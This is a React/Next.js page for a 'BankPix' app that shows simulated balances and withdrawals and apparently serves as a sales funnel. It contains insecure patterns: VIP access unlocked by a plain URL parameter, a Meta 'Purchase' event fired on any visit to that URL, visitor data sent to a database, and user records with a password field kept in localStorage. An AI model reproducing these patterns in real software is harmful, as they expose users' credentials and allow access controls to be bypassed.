'use client'

import { useState, useCallback, useEffect, Suspense } from 'react'
import { useSearchParams } from 'next/navigation'
import { LoginScreen } from '@/components/login-screen'
import { AppSidebar } from '@/components/app-sidebar'
import { DashboardView } from '@/components/dashboard-view'
import { CreateKeyView } from '@/components/create-key-view'
import { MyKeysView } from '@/components/my-keys-view'
import { WithdrawalView } from '@/components/withdrawal-view'
import { AccountMenu } from '@/components/account-menu'
import { type PixKey, type Transaction } from '@/lib/store'

type View = 'dashboard' | 'create-key' | 'my-keys' | 'withdrawal'

interface UserData {
  name: string
  phone: string
  password: string
  balance: number
  income: number
  keys: PixKey[]
  transactions: Transaction[]
}

const VIP_PAGE_MARKER = 'vip'

// Constantes de valor e moeda para o rastreamento do Facebook Ads
const PURCHASE_VALUE = 1000.00 // Ajuste para o valor exato da sua venda em Meticais
const PURCHASE_CURRENCY = 'MZN'

async function salvarAcessoNoBanco(
  nome: string,
  telefone: string,
  tipoAcesso: string,
) {
  try {
    const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL
    const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY

    if (!supabaseUrl || !supabaseAnonKey) {
      console.error('Variáveis do Supabase não configuradas.')
      return
    }

    const response = await fetch(
      `${supabaseUrl}/rest/v1/bankpix_users`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          apikey: supabaseAnonKey,
          Authorization: `Bearer ${supabaseAnonKey}`,
          Prefer: 'return=representation',
        },
        body: JSON.stringify({
          name: nome,
          phone: telefone,
          access_type: tipoAcesso,
          status:
            tipoAcesso === 'VIP'
              ? 'VIP_UNLOCKED'
              : 'PENDENTE',
        }),
      },
    )

    if (!response.ok) {
      console.error(
        'Erro ao salvar acesso:',
        await response.text(),
      )
    }
  } catch (error) {
    console.error('Erro de conexão com o banco:', error)
  }
}

async function enviarNotificacaoVip() {
  try {
    await fetch('/api/send-email', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        user: 'Visitante VIP',
        phone: 'Acesso pelo link VIP',
        accessType: 'VIP_UNLOCKED',
        timestamp: new Date().toISOString(),
        url: window.location.href,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
      }),
    })
  } catch (error) {
    console.error(
      'Erro ao enviar notificação VIP:',
      error,
    )
  }
}

function MainApp({ vslVersion = '9' }: { vslVersion?: string }) {
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [userName, setUserName] = useState('')
  const [userPhone, setUserPhone] = useState('')
  const [balance, setBalance] = useState(0)
  const [income, setIncome] = useState(0)
  const [keys, setKeys] = useState<PixKey[]>([])
  const [transactions, setTransactions] = useState<Transaction[]>([])
  const [currentView, setCurrentView] = useState<View>('dashboard')
  const [showAccountMenu, setShowAccountMenu] = useState(false)

  const searchParams = useSearchParams()
  const isUnlocked = searchParams.get('acesso') === 'vip'

  useEffect(() => {
    const url = new URL(window.location.href)
    const isVipPage =
      url.pathname.toLowerCase().includes('/vip') ||
      url.searchParams.get('acesso') === 'vip'

    if (!isVipPage) {
      void salvarAcessoNoBanco(
        'Visitante Grátis',
        'Pendente',
        'FREE',
      )
      return
    }

    // ------------------------------------------------------------------------
    // DISPARO DO EVENTO PURCHASE (META ADS)
    // ------------------------------------------------------------------------
    const purchasePersistentKey = 'fb_purchase_tracked_permanent'
    const purchaseSessionKey = 'fb_purchase_tracked_session'

    const alreadyTrackedPermanently = localStorage.getItem(purchasePersistentKey)
    const alreadyTrackedSession = sessionStorage.getItem(purchaseSessionKey)

    // Apenas dispara se NÃO tiver sido registrado no dispositivo ou na sessão atual
    if (!alreadyTrackedPermanently && !alreadyTrackedSession) {
      // Seta as travas para nunca mais repetir para este usuário/dispositivo
      localStorage.setItem(purchasePersistentKey, 'true')
      sessionStorage.setItem(purchaseSessionKey, 'true')

      // Executa o disparo do Pixel se o SDK estiver carregado
      if (typeof window !== 'undefined' && (window as any).fbq) {
        (window as any).fbq('track', 'Purchase', {
          value: PURCHASE_VALUE,
          currency: PURCHASE_CURRENCY,
        })
      }
    }
    // ------------------------------------------------------------------------

    const visitKey = `vip-visit-notified:${url.pathname}`
    if (!sessionStorage.getItem(visitKey)) {
      sessionStorage.setItem(visitKey, 'true')

      void fetch('/api/notify-visit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          pageType: VIP_PAGE_MARKER,
          url: window.location.href,
          referrer: document.referrer,
          userAgent: navigator.userAgent,
        }),
      }).catch((error) => {
        console.error('[v0] Erro ao enviar alerta VIP:', error)
      })
    }

    const notificationKey = 'vip-email-notified'
    if (!sessionStorage.getItem(notificationKey)) {
      sessionStorage.setItem(notificationKey, 'true')
      void enviarNotificacaoVip()
    }

    void salvarAcessoNoBanco(
      'Visitante VIP',
      'VIP',
      'VIP',
    )
  }, [isUnlocked])

  useEffect(() => {
    if (!isLoggedIn || !userPhone) return

    const userData: UserData = {
      name: userName,
      phone: userPhone,
      password: '',
      balance,
      income,
      keys,
      transactions,
    }

    const savedUser = localStorage.getItem(
      `bankpix_user_${userPhone}`,
    )

    if (savedUser) {
      const existingData = JSON.parse(savedUser)
      userData.password = existingData.password
    }

    localStorage.setItem(
      `bankpix_user_${userPhone}`,
      JSON.stringify(userData),
    )
  }, [
    isLoggedIn,
    userName,
    userPhone,
    balance,
    income,
    keys,
    transactions,
  ])

  const handleLogin = useCallback(
    (userData: UserData) => {
      setUserName(userData.name)
      setUserPhone(userData.phone)
      setBalance(userData.balance)
      setIncome(userData.income)
      setKeys(userData.keys || [])
      setTransactions(userData.transactions || [])
      setIsLoggedIn(true)

      const tipoAcesso = isUnlocked ? 'VIP' : 'FREE'

      void salvarAcessoNoBanco(
        userData.name,
        userData.phone,
        tipoAcesso,
      )
    },
    [isUnlocked],
  )

  const handleLogout = useCallback(() => {
    setIsLoggedIn(false)
    setUserName('')
    setUserPhone('')
    setCurrentView('dashboard')
    setKeys([])
    setTransactions([])
    setBalance(0)
    setIncome(0)
    setShowAccountMenu(false)
  }, [])

  const handleNavigate = useCallback((view: View) => {
    setCurrentView(view)
  }, [])

  const handleAddKey = useCallback((key: PixKey) => {
    setKeys((previousKeys) => [key, ...previousKeys])
  }, [])

  const handleWithdrawal = useCallback(
    (transaction: Transaction) => {
      setBalance(
        (currentBalance) =>
          currentBalance - transaction.amount,
      )

      setTransactions((previousTransactions) => [
        transaction,
        ...previousTransactions,
      ])
    },
    [],
  )

  if (!isLoggedIn) {
    return (
      <LoginScreen
        onLogin={handleLogin}
        vslVersion={vslVersion}
      />
    )
  }

  return (
    <div className="flex min-h-screen flex-col bg-gray-950 text-white lg:flex-row">
      <AccountMenu
        isOpen={showAccountMenu}
        onClose={() => setShowAccountMenu(false)}
        userName={userName}
        userPhone={userPhone}
      />

      <div className="hidden lg:block">
        <AppSidebar
          currentView={currentView}
          onViewChange={setCurrentView}
          userName={userName}
          userPhone={userPhone}
          onLogout={handleLogout}
          onOpenAccountMenu={() =>
            setShowAccountMenu(true)
          }
        />
      </div>

      <main className="m-0 min-h-screen w-full p-0 lg:pl-64">
        <div className="w-full p-0 md:p-6 lg:p-8">
          {currentView === 'dashboard' && (
            <DashboardView
              userName={userName}
              balance={balance}
              income={income}
              keys={keys}
              transactions={transactions}
              onNavigate={handleNavigate}
              vslVersion={vslVersion}
            />
          )}

          {currentView === 'create-key' && (
            <CreateKeyView
              userName={userName}
              onAddKey={handleAddKey}
              onBack={() =>
                setCurrentView('dashboard')
              }
              vslVersion={vslVersion}
            />
          )}

          {currentView === 'my-keys' && (
            <MyKeysView
              keys={keys}
              onCreateKey={() =>
                setCurrentView('create-key')
              }
              onBack={() =>
                setCurrentView('dashboard')
              }
            />
          )}

          {currentView === 'withdrawal' && (
            <WithdrawalView
              balance={balance}
              onWithdrawal={handleWithdrawal}
              onBack={() =>
                setCurrentView('dashboard')
              }
            />
          )}
        </div>
      </main>
    </div>
  )
}

export default function Home(props: {
  vslVersion?: string
}) {
  return (
    <Suspense
      fallback={
        <div className="flex min-h-screen items-center justify-center bg-gray-950 text-white">
          Carregando...
        </div>
      }
    >
      <MainApp {...props} />
    </Suspense>
  )
}
